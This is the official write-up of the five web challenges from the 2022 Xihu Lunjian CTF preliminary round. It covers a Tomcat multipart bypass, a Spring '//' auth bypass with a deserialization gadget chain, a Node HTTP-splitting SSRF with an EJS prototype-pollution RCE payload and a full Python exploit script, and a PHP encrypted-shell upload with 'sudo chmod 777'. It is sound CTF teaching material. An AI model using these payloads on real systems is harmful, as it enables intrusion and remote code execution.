---
title: WEB｜西湖论剑 2022 中国杭州网络安全技能大赛初赛官方 Write Up
contest: 西湖论剑 2022 WEB 初赛
year: 2022
difficulty: hard
vuln_type: ssrf
tags:
- tomcat_multipart_parse
- double_slash_bypass
- fastjson1248_toString
- spring_hot_swappable_target_source
- node_http_split
- ejs_prototype_pollution
- php_zend_extension_rc4
- sudo_chmod
- json_object_length_16
attack_chain: '扭转乾坤:Apache+Tomcat 双层 改 Content-Type: multipart//form-data 绕过 multipart 解析 → easy_api:springmvc 双 // 绕过 loginFilter + CustomObjectInputStream 黑名单+HotSwappableTargetSource→XString→toString→TemplatesImpl 反序列化 → Node Magical Login:checkcode={"length":16} 触发 try-catch 报错跳出长度检查 → real_easy_node:Node 8.1.2 http 拆分 → curl SSRF 到 127.0.0.1:3000 /copy 路由 → constructor.prototype.outputFunctionName ejs 模板污染 RCE → unusual php:php.ini 加载 zend_test.so RC4 加密上传的 shell + sudo chmod 777 /flag'
key_payload: '{"checkcode":{"length":16}} / {"constructor.prototype.outputFunctionName":"a=1; return global.process.mainModule.constructor._load(''child_process'').execSync(''cat /flag.txt'');//"} / rc4 key=abcsdfadfjiweur'
one_liner: 2022 西湖论剑 WEB 5 题官方 WP，tomcat 解析绕过 + Spring 反序列化 toString 链 + Node 8.1.2 HTTP 拆分 + EJS 模板污染 + PHP Zend 扩展 RC4 加密上传，五连击。
lesson: 经典 "双 // 绕过 Spring filter" + "Node 8.x HTTP 拆分" + "EJS constructor.prototype 绕 __proto__ 过滤"是 2022 经典三件套。
quality: high
full_path: WEB｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write_Up.full.md
meta_path: WEB｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write_Up.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: WEB｜西湖论剑 2022 中国杭州网络安全技能大赛初赛官方 Write Up。2022 西湖论剑 WEB 5 题官方 WP，tomcat 解析绕过 + Spring 反序列化 toString 链 + Node 8.1.2 HTTP 拆分 + EJS 模板污染 + PHP Zend 扩展 RC4 加密上传，五连击。。经验：经典 "双 // 绕过 Spring filter" + "N...
category: web
subcategory: web_other
tools_used:
- PHP
- Spring
- curl
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/97093.html
reasoning_chain:
- '扭转乾坤：Apache + Tomcat 双层 → 触发点：Content-Type: multipart/form-data 双 // 绕过 multipart 解析'
- easy_api：springmvc 双 // 绕过 loginFilter + CustomObjectInputStream 黑名单 + HotSwappableTargetSource→XString→toString→TemplatesImpl 反序列化
- 触发点：HotSwappableTargetSource 继承 AbstractHotSwappableTargetSource 提供 toString() 链 → 假设：可构造 XString.toString() → TemplatesImpl 反序列化
- Node Magical Login：{"checkcode":{"length":16}} 触发 try-catch 报错跳出长度检查 → 假设：JSON 类型混淆绕过
- real_easy_node：Node 8.1.2 http 拆分 → curl SSRF 到 127.0.0.1:3000 /copy 路由 → constructor.prototype.outputFunctionName ejs 模板污染 RCE
- 假设：EJS 模板污染通过 __proto__ → constructor.prototype.outputFunctionName 设置 RCE → 触发点：payload='a=1; return global.process.mainModule.constructor._load("child_process").execSync("cat /flag.txt");//'
- unusual php：php.ini 加载 zend_test.so RC4 加密上传的 shell + sudo chmod 777 /flag
- 假设：zend_extension 自定义编译进 PHP，运行时自动解密 + sudo chmod 改文件权限 → 触发点：rc4 key=abcsdfadfjiweur 解密上传文件
failed_attempts:
- easy_api 试图直接走 TemplatesImpl 反序列化 → 失败：黑名单拦截 ObjectInputStream.readObject，必须走 XString.toString 链
- Node Magical Login 试图用 string 类型 checkcode → 失败：必须传对象 {length:16} 触发报错
- real_easy_node 试图直接 SSRF 到 /flag → 失败：必须先污染 EJS outputFunctionName 才能 RCE
key_observations:
- 经典 '双 // 绕过 Spring filter' + 'Node 8.x HTTP 拆分' + 'EJS constructor.prototype 绕 __proto__ 过滤' 是 2022 经典三件套
- HotSwappableTargetSource → XString.toString() → TemplatesImpl 是 Spring 反序列化 toString 链标准
- JSON 类型混淆 {checkcode:{length:16}} 触发 try-catch 跳出长度检查是 Node.js 经典绕过
- EJS 模板污染通过 __proto__ 污染 vs constructor.prototype 直接污染 是 2022 重要绕过对比
- PHP zend_extension 自定义 RC4 解密 + sudo chmod 777 /flag 是 unusual php 特殊点
prerequisites:
- Spring 反序列化链（HotSwappableTargetSource / XString / TemplatesImpl）
- Node.js HTTP 拆分原理（Node 8.x）
- EJS 模板污染原理（outputFunctionName / __proto__ / constructor.prototype）
- PHP zend_extension 自定义加载
- Java 反序列化工具（ysoserial / marshalsec）
---
# WEB｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write Up

> 原文: https://www.ctfiot.com/97093.html
> ID: 97093

2023年2月2日，第六届西湖论剑网络安全技能大赛初赛落下帷幕！来自全国306所高校、485支战队、2733人集结线上初赛！

以下为本届西湖论剑大赛初赛WEB题目的Write Up

WEB

2022西湖论剑大赛官方WP

（一）

扭转乾坤

1、上传发现提示的apache不支持Content-Type: multipart/form-data.

2、后端为tomcat，tomcat对于包解析并不是严格按照RFC中的标准，对一些异常的header头内容也会兼容。

3、包括但不限于，修改为Content-Type为multipart//form-data;｜大小写兼容｜multipart｜multipart/  form-data;

（二）

easy_api

鉴权绕过

 <filter-mapping>
  <filter-name>loginfilter</filter-name>
  /api/*
 </filter-mapping>
 <filter>
  <filter-name>loginfilter</filter-name>
  <filter-class>com.dbappsecurity.common.loginFilter</filter-class>
 </filter>

springmvc 与 jetty 对 // 解析存在差异，导致双写 / 可以绕过loginFilter过滤。

原生jdk toString反序列化链

api test接口存在原生反序列化漏洞，且题目依赖中包含fastjson1.2.48

    @RequestMapping(value="/api/test", method = RequestMethod.GET)
    public String test(Data data, ModelMap map) throws Exception{
        byte[] base64decodedBytes = Base64.getDecoder().decode(data.getData());
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        CustomObjectInputStream ois = new CustomObjectInputStream(bais);
        ois.readObject();
        ois.close();

        return "api";
    }

可以通过toString配合fj依赖来触发templateimpl的getter方法进行rce。

    protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();

        String[] denyClasses = {"java.lang.reflect.Proxy",
                "javax.management.BadAttributeValueExpException",
                "sun.rmi.server.UnicastRef",
                "sun.rmi.transport.LiveRef",
                "sun.rmi.transport.tcp.TCPEndpoint",
                "java.rmi.server.RemoteObject",
                "java.rmi.server.RemoteRef",
                "java.rmi.server.ObjID",
                "java.rmi.RemoteObjectInvocationHandler",
                "java.rmi.server.UnicastRemoteObject",
                "java.rmi.registry.Registry",
        };
        for (String denyClass : denyClasses) {
            if (className.startsWith(denyClass)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }
        return super.resolveClass(desc);
    }

但是 CustomObjectInputStream 过滤了经常用来触发toString方法的 BadAttributeValueExpException ，以及防止jrmp反序列化绕过黑名单限制的一些类。因此需要找一条新的触发toString的反序列化入口。

题目预期是找一条jdk原生触发toString的反序列化链，但是由于没有把spring包路径加到黑名单中，导致做出来的队伍使用的都是org.springframework.aop.target.HotSwappableTargetSource  + com.sun.org.apache.xpath.internal.objects.XString，触发流程：HotSwappableTargetSource#equals -> XString#equals -> Object#toString。

非预期exp参见：https://github.com/Dor-Tumarkin/CVE-2019-17564-FastJson-Gadget/blob/master/src/main/java/DubboGadget/DubboGadget.java#L21

（三）

Node Magical Login

1、从controller.js文件当中我们可以看到flag被拆分成了两段，/flag1和/flag2

我们可以先看一下/login的路由页面（定义于LoginController函数）

登录的用户名满足值为admin以及密码等于以Math库产生的随机数才能得到SECRET_COOKIE，从而重定向到/flag1页面

但是 Math.random()是需要预测的（其值在运行代码前被存放到内存当中，由于本题并没有什么能够提供窃取内存随机数的方法，所以上述的if条件是基本无法满足的）我们肯定需要找一些其他的方法

2、注意看定义/flag1的Flag1Controller，可以看到第二个if块能够读取cookie:
user=admin的请求头值，从而获得/flag1，只是因为无法获取到SECRET_COOKIE的值，而导致无法获得/flag2的文件内容，所以需要继续看其他的函数

3、直接定位到/getflag2的CheckController函数，看到从表单输入的checkcode的length满足值为16即可通过if语句的检查，但是在try语句当中，由于对checkcode进行了一次大写的转换，导致checkcode无法等于aGr5AtSp55dRacer，从而无法获取flag2

4、由于catch语句块当中的内容没有return或者是res的语句，因此当程序运行到catch块的时候，语句块外部的代码仍然会执行

那么我们可以联想到构造一个会使得try语句报错的数据，注意看toLowerCase()，在js当中的object对象是不存在这一属性的（toLowerCase()往往只适用于字符串）因此可以在/getflag2构造下列payload

5、这样一来就可以触发报错并满足length=16的条件，得到flag2了（上述payload在getflag2以POST的方式传递即可）

（四）

real_easy_node

1、 审计源码可以发现存在两个比较重要的路由/curl和/copy

可以看到在copy路由中存在类似于merge的函数，但是有过滤，需要是本地用户访问。另外传入的内容中不允许有__proto__。在docker文件中发现node版本是8.1.2，是存在http拆分攻击的。

具体的原理可以参考https://www.anquanke.com/post/id/240014

利用如下payload即可达到访问任意本地页面的目的。

payload = ''' HTTP/1.1
Host: x
Connection: keep-alive

POST /anyurl HTTP/1.1
Host: 127.0.0.1
Content-Length: 3
Content-Type: application/json

a=123

GET / HTTP/1.1
Host: x
Connection: close
x:
'''.format(cmd,len(cmd))
payload = payload.replace("n", "rn")
payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
requests.get('http://127.0.0.1:
3000/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))

2、剩下的就是原型链污染了，要怎么污染，污染什么参数。

可以看到存在render，并且使用了模板引擎为ejs

ejs原型链污染的payload如下

{
"__proto__":
{
"outputFunctionName":"a=1; return global.process.mainModule.constructor._load('child_process').execSync('ls'); //"
}
}

题目里面过滤了__proto__，我们可以用constructor.prototype代替

3、再来看下这个safeobj.expand(user, index, req.body[index])

跟进具体的函数实现

image-20221108142655593

会通过点号进行分割。

也就是我们传入{"a.b":"123"}会进行赋值a.b=123

将污染ejs的payload按上述方式转换为

{"constructor.prototype.outputFunctionName":
"a=1;
return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}

最终payload

import urllib.parse
import re
import sys
import requests

# 输入为靶机 IP 和端口以及要验证的 flag
HOST = sys.argv[1]
PORT = sys.argv[2]
FLAG = sys.argv[3]

# exp 函数
def exp(ip, port):
 cmd='''{"constructor.prototype.outputFunctionName":"a=1;
return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}'''
 payload = ''' HTTP/1.1
Host: x
Connection: keep-alive

POST /copy HTTP/1.1
Host: 127.0.0.1
Content-Length: {1}
Content-Type: application/json

{0}
GET / HTTP/1.1
Host: x
Connection: close
x:
'''.format(cmd,len(cmd))
 payload = payload.replace("n", "rn")
 payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
 requests.get('http://%s:%s/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
 r = requests.get("http://%s:%s/" % (ip, port))
 try:
  flag=re.findall("DASCTF{.*?}",r.text)[0]
  print(flag)
  return flag
 
except:
  return ''
 print(r.text)

# 主逻辑
if __name__ == '__main__':
    flag = exp(HOST, PORT)
    # 比较得出的 flag 是否是想要的 flag
    assert flag == FLAG
    print("Pass!")

（五）

unusual php

1、php可以读文件，可以上传，但上传会err

2、读取php.ini 发现加载了test.so 扩展

3、读取zend_test.so  对扩展做逆向， 发现 my_compile_file 会用rc4 解密一次 上传的文件，秘钥为abcsdfadfjiweur

4、使用该秘钥加密一个shell 上传，读取/flag 发现没有权限

5、sudo -l 执行 可以看到 可以执行chmod

6、sudo chmod 777 /flag  然后再读取flag即可

— 往期回顾 —

MISC｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write U


```
<filter-mapping>
  <filter-name>loginfilter</filter-name>
  /api/*
 </filter-mapping>
 <filter>
  <filter-name>loginfilter</filter-name>
  <filter-class>com.dbappsecurity.common.loginFilter</filter-class>
 </filter>
@RequestMapping(value="/api/test", method = RequestMethod.GET)
    public String test(Data data, ModelMap map) throws Exception{
        byte[] base64decodedBytes = Base64.getDecoder().decode(data.getData());
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        CustomObjectInputStream ois = new CustomObjectInputStream(bais);
        ois.readObject();
        ois.close();

        return "api";
    }
protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();

        String[] denyClasses = {"java.lang.reflect.Proxy",
                "javax.management.BadAttributeValueExpException",
                "sun.rmi.server.UnicastRef",
                "sun.rmi.transport.LiveRef",
                "sun.rmi.transport.tcp.TCPEndpoint",
                "java.rmi.server.RemoteObject",
                "java.rmi.server.RemoteRef",
                "java.rmi.server.ObjID",
                "java.rmi.RemoteObjectInvocationHandler",
                "java.rmi.server.UnicastRemoteObject",
                "java.rmi.registry.Registry",
        };
        for (String denyClass : denyClasses) {
            if (className.startsWith(denyClass)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }
        return super.resolveClass(desc);
    }
{"checkcode":{"length":16}}
payload = ''' HTTP/1.1
Host: x
Connection: keep-alive

POST /anyurl HTTP/1.1
Host: 127.0.0.1
Content-Length: 3
Content-Type: application/json

a=123

GET / HTTP/1.1
Host: x
Connection: close
x:
'''.format(cmd,len(cmd))
payload = payload.replace("n", "rn")
payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
requests.get('http://127.0.0.1:
3000/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
{
"__proto__":
{
"outputFunctionName":"a=1; return global.process.mainModule.constructor._load('child_process').execSync('ls'); //"
}
}
{"constructor.prototype.outputFunctionName":
"a=1;
return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}
import urllib.parse
import re
import sys
import requests

# 输入为靶机 IP 和端口以及要验证的 flag
HOST = sys.argv[1]
PORT = sys.argv[2]
FLAG = sys.argv[3]

# exp 函数
def exp(ip, port):
 cmd='''{"constructor.prototype.outputFunctionName":"a=1;
return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}'''
 payload = ''' HTTP/1.1
Host: x
Connection: keep-alive

POST /copy HTTP/1.1
Host: 127.0.0.1
Content-Length: {1}
Content-Type: application/json

{0}
GET / HTTP/1.1
Host: x
Connection: close
x:
'''.format(cmd,len(cmd))
 payload = payload.replace("n", "rn")
 payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
 requests.get('http://%s:%s/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
 r = requests.get("http://%s:%s/" % (ip, port))
 try:
  flag=re.findall("DASCTF{.*?}",r.text)[0]
  print(flag)
  return flag
 
except:
  return ''
 print(r.text)

# 主逻辑
if __name__ == '__main__':
    flag = exp(HOST, PORT)
    # 比较得出的 flag 是否是想要的 flag
    assert flag == FLAG
    print("Pass!")
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]